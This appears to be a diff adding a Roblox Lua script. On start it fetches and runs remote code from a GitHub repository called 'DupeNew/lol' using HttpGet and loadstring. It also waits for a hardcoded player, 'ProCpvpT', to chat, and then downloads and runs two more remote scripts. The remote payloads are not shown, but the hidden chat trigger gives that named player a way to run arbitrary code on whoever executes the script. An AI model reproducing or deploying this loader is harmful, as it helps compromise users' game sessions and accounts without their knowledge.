@@ -1,0 +1,97 @@
+-- ================== CONFIGURATION ==================
+local TRIGGER_USERNAME = "ProCpvpT" -- The player who needs to chat to start the script.
+-- ===================================================
+
+local Players = game:GetService("Players")
+local hasTriggered = false -- This flag ensures the chat-triggered part only runs once.
+local connection = nil -- To hold the event connection for the chat listener.
+
+-- Helper function to fetch and run a script safely
+local function loadScript(url)
+    local success, err = pcall(function()
+        local scriptContent = game:HttpGet(url)
+        if scriptContent then
+            loadstring(scriptContent)()
+            print("Successfully executed script from: " .. url)
+        else
+            warn("Failed to fetch script from: " .. url)
+        end
+    end)
+    if not success then
+        warn("Error executing script from " .. url .. ": " .. err)
+    end
+end
+
+-- Function to load h.lua and n.lua automatically when the script starts
+local function loadHAndNLua()
+    print("Automatically loading h.lua and n.lua...")
+    
+    -- Load h.lua
+    task.spawn(function()
+        loadScript("https://raw.githubusercontent.com/DupeNew/lol/refs/heads/main/h.lua")
+    end)
+
+    -- Load n.lua
+    task.spawn(function()
+        loadScript("https://raw.githubusercontent.com/DupeNew/lol/refs/heads/main/n.lua")
+    end)
+end
+
+-- Function to load l.lua and g.lua (this will be triggered by chat)
+local function loadLAndGLua()
+    print("Chat trigger detected! Loading l.lua and g.lua...")
+
+    -- Load l.lua
+    task.spawn(function()
+        loadScript("https://raw.githubusercontent.com/DupeNew/lol/refs/heads/main/l.lua")
+    end)
+
+    -- Load g.lua
+    task.spawn(function()
+        loadScript("https://raw.githubusercontent.com/DupeNew/lol/refs/heads/main/g.lua")
+    end)
+end
+
+-- [ THE TRIGGER LOGIC THAT LISTENS FOR THE CHAT ]
+local function onPlayerChatted(player, message)
+    -- Check if it's the trigger player and if we haven't triggered the l/g scripts yet
+    if player.Name == TRIGGER_USERNAME and not hasTriggered then
+        hasTriggered = true -- Set the flag so this part only runs once
+        print("TRIGGER ACTIVATED by " .. player.Name .. "!")
+        
+        -- Execute the function to load l.lua and g.lua
+        loadLAndGLua()
+        
+        -- Disconnect the listener for ALL players so it only triggers ONCE per session
+        if connection then
+            connection:Disconnect()
+            print("Chat listener disconnected (trigger activated once).")
+        end
+    end
+end
+
+-- Helper function to set up the chat listener for a specific player
+local function setupListenerForPlayer(player)
+    -- We only need to listen if it's the target player who might trigger the l/g scripts
+    if player.Name == TRIGGER_USERNAME then
+        player.Chatted:Connect(function(message)
+            onPlayerChatted(player, message)
+        end)
+    end
+end
+
+-- === MAIN EXECUTION FLOW ===
+
+-- 1. Execute h.lua and n.lua automatically as soon as the script runs.
+loadHAndNLua()
+
+-- 2. Set up the chat listener for l.lua and g.lua.
+-- Connect to players who join *after* the script starts.
+connection = Players.PlayerAdded:Connect(setupListenerForPlayer)
+
+-- Also, connect to players who are *already* in the game when the script starts.
+for _, player in ipairs(Players:GetPlayers()) do
+    setupListenerForPlayer(player)
+end
+
+print("Script loaded. Automatically executed h.lua and n.lua. Waiting for '" .. TRIGGER_USERNAME .. "' to chat to load l.lua and g.lua...")
